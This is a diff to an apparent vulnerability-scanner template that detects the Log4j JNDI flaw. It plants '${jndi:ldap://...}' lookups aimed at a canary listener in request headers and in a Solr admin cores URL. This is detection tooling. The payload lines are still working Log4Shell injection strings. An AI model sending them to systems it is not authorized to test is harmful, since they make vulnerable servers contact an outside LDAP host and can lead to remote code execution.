@@ -4,8 +4,8 @@ info:
   author: anchorscan
   severity: high
   description: |
-    Plants canary_base/canary_token into common Log4j JNDI header slots.
-    The anchorscan process-local canary listener emits the Finding on callback
+    Plants canary_ldap/canary_token into Log4j JNDI slots (headers + Solr admin action).
+    The anchorscan process-local LDAP/HTTP canary listener emits the Finding on callback
     (confidence=verified); nuclei matchers are intentionally empty.
   tags:
     - canary
@@ -14,8 +14,8 @@ http:
   - method: GET
     path:
       - "{{BaseURL}}"
+      - "{{BaseURL}}/solr/admin/cores?action=${jndi:ldap://{{canary_ldap}}/{{canary_token}}}"
     headers:
-      User-Agent: "${jndi:http://{{canary_host}}/c/{{canary_token}}}"
-      X-Api-Version: "${jndi:http://{{canary_host}}/c/{{canary_token}}}"
-      Referer: "{{canary_base}}/c/{{canary_token}}"
+      User-Agent: "${jndi:ldap://{{canary_ldap}}/{{canary_token}}}"
+      X-Api-Version: "${jndi:ldap://{{canary_ldap}}/{{canary_token}}}"
     # Channel self-check: no matchers — finding comes from canary listener only.
